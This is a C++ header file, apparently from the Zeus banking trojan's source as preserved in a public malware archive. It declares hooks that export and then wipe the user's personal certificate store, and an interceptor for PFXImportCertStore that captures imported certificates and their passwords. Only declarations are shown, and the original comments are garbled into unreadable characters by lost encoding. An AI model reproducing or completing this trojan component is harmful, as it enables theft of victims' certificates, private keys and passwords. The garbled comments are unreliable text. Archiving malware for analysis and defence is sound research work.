/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  �������� CertStore.
*/
#pragma once

namespace CertStoreHook
{
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);
  
  /*
    ��������� ����������� �� �������� MY-��������� ������������.

    Return - true - ���� ��������� ������� ��������� � �������� � �����, ���� ����������� > 0.
             true - ���� ��������� ������� ��������� � ���� ����������� == 0.
             false - � ������ ������.
  */
  bool _exportMy(void);

  /*
    �������� ����������� �� �������� MY-��������� ������������.      

    Return - true - � ������ ������,
             false - � ������ ������.
  */
  bool _clearMy(void);
  
  /*    Interceptor PFXImportCertStore.
  */
  void * WINAPI _hookerPfxImportCertStore(CRYPT_DATA_BLOB *data, LPCWSTR password, DWORD flags);
};
